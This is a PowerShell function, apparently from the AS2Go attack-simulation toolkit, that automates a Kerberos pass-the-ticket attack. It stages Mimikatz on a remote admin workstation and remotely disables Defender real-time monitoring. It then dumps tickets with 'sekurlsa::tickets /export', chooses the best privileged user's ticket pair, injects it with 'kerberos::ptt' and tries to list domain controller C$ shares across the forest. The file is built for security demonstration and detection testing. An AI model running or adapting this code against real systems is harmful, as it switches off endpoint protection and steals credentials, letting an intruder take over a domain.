<#
.SYNOPSIS
Harvests and reuses Kerberos tickets in the AS2Go Pass-the-Ticket demonstration.

.DESCRIPTION
Reads the configured admin workstation and ticket share, stages Mimikatz there, and harvests Kerberos tickets.
Analyzes .kirbi files, summarizes available accounts, and recommends an account with a TGT and service ticket.
Allows another candidate, copies its tickets, and selects a suitable pair for injection with Mimikatz.
Displays cached tickets and attempts to enumerate DC C$ shares across forest domains using the resulting context.

.EXAMPLE
Invoke-PassTheTicketAttack
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires initialized workstation/share settings, Mimikatz, remoting access, and usable tickets.
The workflow clears existing ticket staging locations before collecting new tickets.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Harvests Kerberos tickets on the configured admin workstation and reviews available ticket identities.
Selects and injects a TGT and service-ticket pair to demonstrate impersonation without the account password.
Inspects cached tickets and attempts to list domain controller admin shares across the forest.
#>
function Invoke-PassTheTicketAttack {
    
    $Info = Measure-FunctionRuntime -Begin

    $Script:ASSAW = Get-ASConfig -Setting "mySAW"
    $Script:ASTicketsUNCPath = Get-ASConfig -Setting "ticketsPath"

    $TicketsSourcePath = "\\$Script:ASSAW\$Script:ASTicketsUNCPath"
    $TicketsTargetPath = $Script:AS2GOTempDir
    $TicketsToAbusePath = $Script:AS2GOTicketsDir

    $path = Get-ASConfig -Setting "Tools"
    $tool1 = join-path -path $path -childpath "mimikatz.exe"
    $tool2 = join-path -path $path -childpath "PsExec.exe"
    
    If (-not $SkipClearHost) { Clear-Host }
    
    Write-AS2GoOutput -Type Header -Message "Pass-the-Ticket (PtT) Attack"
    Write-AS2GoOutput -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack, where stolen Kerberos tickets are used to impersonate a user and access resources on the network. `nIn this case, we will attempt to use stolen tickets to access the Domain Controller's c$ share and list NetBIOS sessions.`n"
    Write-AS2GoOutput -Type Bullet -Message "Step #1 - stage mimikatz on Admin PC"
    Write-AS2GoOutput -Type Bullet -Message "Step #2 - harvest tickets on Admin PC"
    Write-AS2GoOutput -Type Bullet -Message "Step #3 - run PtT to become Domain Admin"

    #
    If ($UnAttended) { Start-Sleep 2 } else { 
    
        $Options = @(
            [pscustomobject] @{
                Label = "&Yes"
                Help  = "All prerequisites are met. Proceed with the PtT simulation."
                Value = $Script:Yes
            },
            [pscustomobject] @{
                Label = "&Skip"
                Help  = "The Admin PC is not ready. Skip the PtT simulation."
                Value = $Script:No
            }
        )

        $title = "Is the Admin PC ($Script:ASSAW) ready for the Pass-the-Ticket (PtT) attack?"
        $message = "Please confirm that the following prerequisites are met:`n  • Endpoint protection is disabled in the test environment.`n  • Fresh Kerberos tickets are available on the Admin PC."

        $decision = Show-DecisionPrompt -Message $message -Options $Options -Default 1 -Title $title
  
    
        If ($decision -eq $Script:No) {
            Write-AS2GoOutput -Type Quit -Message "Admin PC is not ready for the Pass-the-Ticket (PtT) attack."
            return
        }
    }
    
    
    If (-not $SkipClearHost) { Clear-Host }

    # remove all old tickets
    Try {
        Remove-Item $TicketsToAbusePath\*.kirbi -ErrorAction SilentlyContinue
        Remove-Item -Recurse $TicketsSourcePath  -ErrorAction SilentlyContinue
    }
    Catch {

    }

    If (-not $SkipClearHost) { Clear-Host }

    ###############################################################################################################################

    Write-AS2GoOutput -Type Header -Message "Stage mimikatz on Admin PC $Script:ASSAW"

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = "Copy-Item -Path $tool1 -Destination $TicketsSourcePath  -Recurse"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    #todo 
    #Invoke-Command -ComputerName $computer -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}
    #Invoke-Command -ComputerName $computer -ScriptBlock {Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled}
    #Invoke-Command -ComputerName $computer -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $false}

    #cleanup
    Remove-Item -Recurse $TicketsSourcePath  -ErrorAction Ignore
    New-Item $TicketsSourcePath  -ItemType directory -ErrorAction Ignore | Out-Null
    Copy-Item -Path $tool1  -Destination $TicketsSourcePath  -Recurse
    $result = Get-Childitem -Path $TicketsSourcePath -Filter *.exe

    If ($result) {
        $result | Select-Object FullName, LastWriteTime | Out-Host
        Write-AS2GoOutput -Type Success -Message "File staging on the admin PC succeeded."
    }
    else {
        Write-AS2GoOutput -Type Error -Message "File staging on the admin PC failed."
        return
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    If (-not $SkipClearHost) { Clear-Host }

    
    ####################################################################################################################################
    Write-AS2GoOutput -Type Header -Message "harvest tickets on Admin PC $Script:ASSAW"

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    
    $command = '
    Invoke-Command -Session $session -ScriptBlock {
        Set-Location C:\Temp\tickets
        .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
    }'
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Invoke-Command -ComputerName $Script:ASSAW  -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
    Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock { Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled }
    $session = New-PSSession -ComputerName $Script:ASSAW -ErrorAction Stop
    try {
        $remoteOutput = Invoke-Command -Session $session -ScriptBlock {
            Try {
                #Set-MpPreference -DisableRealtimeMonitoring $true
                Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled
                Set-Location C:\Temp\tickets
                .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
            }
            catch {
                Write-Error $_
            }
            finally {
                Set-MpPreference -DisableRealtimeMonitoring $false
            }
        } -ErrorAction Stop

        $remoteOutput | Out-Host
    }
    finally {
        if ($null -ne $session) {
            Remove-PSSession -Session $session -ErrorAction SilentlyContinue
        }
    }
    
    $alltickets = Get-KirbiTicketInfo -path $TicketsSourcePath

    If ($alltickets) {
        write-host "`n"
        Write-AS2GoOutput -Type Success -Message "Kerberos ticket harvesting on the admin PC succeeded. `
       $($alltickets.Count) 'kirbi' files were found in: $TicketsSourcePath" -NoExtraLines
    }
    else {
        Write-AS2GoOutput -Type Error -Message "Kerberos ticket harvesting on the admin PC failed. `
             No 'kirbi' files were found in: ` 
             $TicketsSourcePath"
        return
    }

    $uniqueInfo = Get-KirbiUniqueInfo -alltickets $alltickets
    $uniqueAccounts = Get-KirbiUniqueAccounts -alltickets $alltickets

    $kirbiFiles = Get-ChildItem -Path $TicketsSourcePath -Filter *.kirbi
    $kirbiTicketCount = ($uniqueAccounts | Measure-Object -Property UniqueSPNCount -Sum ).Sum
    $kirbiUsers = ($uniqueAccounts | Where-Object { $_.AccountType -eq 'User' }).count
    $kirbiComputers = ($uniqueAccounts | Where-Object { $_.AccountType -eq 'Computer' }).count

    Write-Host "`n       The analysis identified $($kirbiFiles.Count) exported Kerberos ticket files,"
    Write-Host "       representing $( $kirbiTicketCount) unique tickets associated with $($kirbiUsers) user accounts and $($kirbiComputers) computer accounts.`n"

    $uniqueAccounts | 
    Select-Object AccountType, Principal, TicketFileCount, UniqueSPNCount, ServiceTicketCount, TGTCount | 
    Sort-object AccountType, TGTCount | Format-Table | out-host

    $bestPtTUser = $uniqueAccounts |
    Where-Object {
        $_.AccountType -eq 'User' -and
        [int]$_.TGTCount -gt 0 -and
        [int]$_.ServiceTicketCount -gt 0
    } |
    Sort-Object `
    @{ Expression = { $_.TGTCount }; Descending = $true },
    @{ Expression = { $_.ServiceTicketCount }; Descending = $true },
    @{ Expression = { $_.UniqueSPNCount }; Descending = $true },
    @{ Expression = { $_.LastSeen }; Descending = $true } |
    Select-Object -First 1

    $candidate = $bestPtTUser.principal
    Write-AS2GoOutput -Type Textmaker -Message "Because both a TGT and a service ticket were present,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate

    $title = "Confirm or change the account whose tickets will be copied"
    $message = ">> $candidate"

    $Options = @(
        [pscustomobject] @{ Label = "&OK"; Help = "Use default candidate."; Value = "OK" },
        [pscustomobject] @{ Label = "&Select a different candidate"; Help = "Type a new candidate."; Value = "New" }   
        #[pscustomobject] @{ Label = "&Cancel"; Help = "Return to main setup."; Value = "Skip" }
    )

    If (-not $UnAttended) {
        $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
    }
    
    Write-Host

    If ($answer -eq "New") {
        $candidate = Write-AS2GoOutput -Type Input -Message "Enter the new candidate"
    }

    Write-AS2GoOutput -Type Header -Message "Copy tickets from Admin PC for candidate '$candidate'"
    #If ($UnAttended) { Start-Sleep 2 } else { Pause }


    If (-not (Test-Path $TicketsTargetPath)) {
        New-Item -Path $TicketsTargetPath -ItemType Directory -Force | Out-Null
    }  
    else {
        Remove-Item -Path "$TicketsTargetPath\*.kirbi" -Force
    }

    Get-Item "$TicketsSourcePath\*-$candidate@*.kirbi" | Copy-Item -Destination $TicketsTargetPath
    $results = Get-Item "$TicketsTargetPath\*-$candidate@*.kirbi"

    If ($results) {
        write-host "`n"
        $results | Format-Table Name
        Write-AS2GoOutput -Type Success -Message "$($results.Count) 'kirbi' files were copied to: $TicketsTargetPath" -NoExtraLines
    }
    else {
        Write-AS2GoOutput -Type Error -Message "Copying tickets from $TicketsSourcePath on the admin PC failed."
        return
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    #Remove-Item -Recurse $TicketsSourcePath 
    
    $bestresult = Get-KirbiBestFiles -alltickets $alltickets -candidate $candidate

    #$bestresult.TicketPairs   | Format-Table Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile -AutoSize
    $selectedPair = $bestresult.TicketPairs   | Select-Object -First 1

    Write-AS2GoOutput -Type H1 -Message "`nBest Ticket Pair Identified"
    $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | out-host

    $4logfile = $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | Out-String

    write-log INFO -Message "Best Ticket Pair Identified: $4logfile"


    Try {
        $TGTFile = $selectedPair.Path
        $ServiceFile = $($selectedPair.Path).Replace($selectedPair.TGTFile, $selectedPair.ServiceFile)
        Copy-Item -LiteralPath $TGTFile -Destination  $TicketsToAbusePath
        Copy-Item -LiteralPath $ServiceFile -Destination $TicketsToAbusePath
    }
    catch {
        write-log ERROR -Message "Failed to copy tickets to $TicketsToAbusePath"
    }


    If (-not $SkipClearHost) { Clear-Host }


    Write-AS2GoOutput -Type Header -Message "load stolen tickets from candidate '$candidate'"
    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = [string]::Format('.\mimikatz.exe  "privilege::debug" "kerberos::ptt {0}" "exit"', $TicketsToAbusePath)
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command


    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    
    Invoke-Command -ScriptBlock { & $tool1 "privilege::debug" "kerberos::ptt $TicketsToAbusePath" "exit" }
    
    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Display currently cached Kerberos tickets"
    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = "klist"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
    
    Set-ASConfig -Setting "LastStage" -Value $Script:PtT
    Set-NewColorSchema -NewStage $Script:PtT
   
    $tickets = Get-KlistTicket -Client $candidate
    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
    Write-AS2GoOutput -Type textmaker -Message "Last Ticket for client" -tm "$candidate"
    $tickets | Select-object -Last 1 | Format-List

    if ($tickets.Count -eq 0) {
        Write-AS2GoOutput -Type Error -Message "No Kerberos tickets found for client '$candidate'"
    }
    else {
        Write-AS2GoOutput -Type Success -Message "Kerberos tickets found for client '$candidate'"
    }
    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
      
    Write-AS2GoOutput -Type Header -Message "Attempting to access a domain controller’s C$ share in each domain"

    Foreach ($domain in  (Get-ADForest).domains) {
        $DC = Get-BestDomainController -Domain $domain
        $directory = "\\$DC\c$"
        Get-DirContent -Path $directory
    }
   
    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Measure-FunctionRuntime -End -Details $Info
}
